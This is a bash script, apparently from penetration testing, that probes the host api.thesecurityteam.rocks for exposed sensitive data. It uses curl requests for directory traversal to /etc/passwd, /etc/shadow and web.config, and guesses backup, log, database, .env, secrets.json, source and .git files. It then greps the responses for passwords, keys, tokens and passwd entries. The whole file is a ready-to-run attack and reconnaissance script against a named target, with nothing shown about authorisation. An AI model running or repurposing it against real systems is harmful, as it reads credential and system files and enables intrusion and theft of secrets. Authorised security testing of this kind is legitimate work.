#!/bin/bash
echo "======================================"
echo "TESTING INSECURE DATA STORAGE - api.thesecurityteam.rocks"
echo "======================================"
echo

TARGET="api.thesecurityteam.rocks"
PROTOCOL="https"
FULL_URL="https://api.thesecurityteam.rocks"

echo "[INFO] Starting Insecure Data Storage testing..."
echo "[TARGET] $FULL_URL"
echo "[TIME] $(date)"
echo

# Test 1: Directory traversal for sensitive files
echo "[TEST 1] Testing directory traversal for sensitive files..."
curl -s -k -X GET "$PROTOCOL://$TARGET/../../../etc/passwd" --connect-timeout 10 --max-time 30 > data_storage_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/..%2f..%2f..%2fetc%2fpasswd" --connect-timeout 10 --max-time 30 >> data_storage_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/../../../etc/shadow" --connect-timeout 10 --max-time 30 >> data_storage_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/../../../windows/system32/drivers/etc/hosts" --connect-timeout 10 --max-time 30 >> data_storage_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/../../../web.config" --connect-timeout 10 --max-time 30 >> data_storage_test1.txt
echo "[RESULT] Check data_storage_test1.txt for sensitive file contents"
echo

# Test 2: Backup file enumeration
echo "[TEST 2] Testing backup file enumeration..."
for ext in bak backup old tmp temp save swp orig; do
    curl -s -k -X GET "$PROTOCOL://$TARGET/config.$ext" --connect-timeout 5 --max-time 15 >> data_storage_test2.txt
    curl -s -k -X GET "$PROTOCOL://$TARGET/database.$ext" --connect-timeout 5 --max-time 15 >> data_storage_test2.txt
    curl -s -k -X GET "$PROTOCOL://$TARGET/index.$ext" --connect-timeout 5 --max-time 15 >> data_storage_test2.txt
    echo "=== Testing .$ext files ===" >> data_storage_test2.txt
done
echo "[RESULT] Check data_storage_test2.txt for backup file discovery"
echo

# Test 3: Log file exposure
echo "[TEST 3] Testing log file exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/logs/access.log" --connect-timeout 10 --max-time 30 > data_storage_test3.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/logs/error.log" --connect-timeout 10 --max-time 30 >> data_storage_test3.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/logs/debug.log" --connect-timeout 10 --max-time 30 >> data_storage_test3.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/../logs/error.log" --connect-timeout 10 --max-time 30 >> data_storage_test3.txt
echo "[RESULT] Check data_storage_test3.txt for log file exposure"
echo

# Test 4: Database file discovery
echo "[TEST 4] Testing database file discovery..."
for db in sqlite db mdb accdb sql; do
    curl -s -k -X GET "$PROTOCOL://$TARGET/data.$db" --connect-timeout 5 --max-time 15 >> data_storage_test4.txt
    curl -s -k -X GET "$PROTOCOL://$TARGET/database.$db" --connect-timeout 5 --max-time 15 >> data_storage_test4.txt
    curl -s -k -X GET "$PROTOCOL://$TARGET/app.$db" --connect-timeout 5 --max-time 15 >> data_storage_test4.txt
    echo "=== Testing .$db files ===" >> data_storage_test4.txt
done
echo "[RESULT] Check data_storage_test4.txt for database file discovery"
echo

# Test 5: Configuration file exposure
echo "[TEST 5] Testing configuration file exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/config.json" --connect-timeout 10 --max-time 30 > data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/config.xml" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/.env" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/.env.local" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/.env.production" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/secrets.json" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/settings.json" --connect-timeout 10 --max-time 30 >> data_storage_test5.txt
echo "[RESULT] Check data_storage_test5.txt for configuration exposure"
echo

# Test 6: Source code exposure
echo "[TEST 6] Testing source code exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/index.php" --connect-timeout 10 --max-time 30 > data_storage_test6.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/index.asp" --connect-timeout 10 --max-time 30 >> data_storage_test6.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/index.jsp" --connect-timeout 10 --max-time 30 >> data_storage_test6.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/app.js" --connect-timeout 10 --max-time 30 >> data_storage_test6.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/main.py" --connect-timeout 10 --max-time 30 >> data_storage_test6.txt
echo "[RESULT] Check data_storage_test6.txt for source code exposure"
echo

# Test 7: API key and secret exposure in responses
echo "[TEST 7] Testing API key and secret exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/api/config" --connect-timeout 10 --max-time 30 > data_storage_test7.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/api/settings" --connect-timeout 10 --max-time 30 >> data_storage_test7.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/api/debug" --connect-timeout 10 --max-time 30 >> data_storage_test7.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/health" --connect-timeout 10 --max-time 30 >> data_storage_test7.txt
echo "[RESULT] Check data_storage_test7.txt for API key exposure"
echo

# Test 8: Git repository exposure
echo "[TEST 8] Testing Git repository exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/.git/config" --connect-timeout 10 --max-time 30 > data_storage_test8.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/.git/HEAD" --connect-timeout 10 --max-time 30 >> data_storage_test8.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/.git/logs/HEAD" --connect-timeout 10 --max-time 30 >> data_storage_test8.txt
echo "[RESULT] Check data_storage_test8.txt for Git repository exposure"
echo

# Test 9: Temporary file exposure
echo "[TEST 9] Testing temporary file exposure..."
curl -s -k -X GET "$PROTOCOL://$TARGET/tmp/file.tmp" --connect-timeout 5 --max-time 15 > data_storage_test9.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/temp/data.tmp" --connect-timeout 5 --max-time 15 >> data_storage_test9.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/cache/session.cache" --connect-timeout 5 --max-time 15 >> data_storage_test9.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/sessions/sid.tmp" --connect-timeout 5 --max-time 15 >> data_storage_test9.txt
echo "[RESULT] Check data_storage_test9.txt for temporary file exposure"
echo

# Test 10: Directory listing and index files
echo "[TEST 10] Testing directory listing and index files..."
curl -s -k -X GET "$PROTOCOL://$TARGET/uploads/" --connect-timeout 10 --max-time 30 > data_storage_test10.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/files/" --connect-timeout 10 --max-time 30 >> data_storage_test10.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/data/" --connect-timeout 10 --max-time 30 >> data_storage_test10.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/backups/" --connect-timeout 10 --max-time 30 >> data_storage_test10.txt
echo "[RESULT] Check data_storage_test10.txt for directory listing"
echo

echo "[COMPLETED] Insecure Data Storage testing completed. Review all data_storage_test*.txt files."
echo "[TIME] $(date)"
echo

# Analysis
echo "[ANALYSIS] Searching for data storage indicators..."
grep -i "password\|secret\|key\|token\|api_key\|private\|db_pass\|mysql\|postgres" *.txt > storage_indicators.txt 2>/dev/null
if [ -s storage_indicators.txt ]; then
    echo "[WARNING] Potential insecure data storage found! Check storage_indicators.txt"
else
    echo "[INFO] No obvious data storage vulnerabilities in initial analysis"
fi

# Check for actual file contents
echo "[FILE ANALYSIS] Checking for actual file contents..."
grep -l "root:\|daemon:\|bin:\|sys:" *.txt > sensitive_files.txt 2>/dev/null
if [ -s sensitive_files.txt ]; then
    echo "[CRITICAL] Sensitive system files may have been accessed! Check sensitive_files.txt"
fi

echo

echo "Insecure Data Storage testing phase completed successfully."
read -p "Press Enter to continue..."